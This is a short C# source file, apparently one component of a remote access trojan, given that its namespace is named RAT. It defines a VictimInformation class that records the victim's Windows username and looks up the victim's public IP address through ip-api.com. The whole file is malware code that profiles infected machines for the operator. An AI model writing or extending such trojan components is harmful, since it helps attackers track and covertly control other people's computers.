using System;
using System.Net;
using System.Net.Http;
using RAT.APIs;

namespace RAT;

public class VictimInformation
{
    public static VictimInformation Shared = new();
    public IPAddress? IP { get; private set; }
    public string UserName { get; } = Environment.UserName;
    public async Task<bool> RefreshIP()
    {
        try
        {
            Stream qJson = await SingleInstance.HttpClient.GetStreamAsync("http://ip-api.com/json/"); // Quick API.
            IpJson victimData = (await System.Text.Json.JsonSerializer.DeserializeAsync<IpJson>(qJson))!;
            IP = IPAddress.Parse(victimData.Query!);
            return true;
        }
        catch
        {
            return false;
        }
    }
}